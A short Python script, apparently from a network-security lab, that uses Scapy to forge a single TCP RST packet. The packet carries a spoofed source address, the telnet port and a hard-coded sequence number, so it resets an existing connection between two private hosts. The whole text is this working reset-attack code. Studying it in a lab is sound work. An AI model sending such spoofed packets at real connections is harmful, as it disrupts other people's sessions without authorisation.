from scapy.all import IP, TCP, send

pkt = IP(src="10.9.0.5", dst="10.9.0.6") / TCP(
    sport=23,
    dport=46582,
    flags="R",
    seq=2139810821,
)
send(pkt, verbose=0)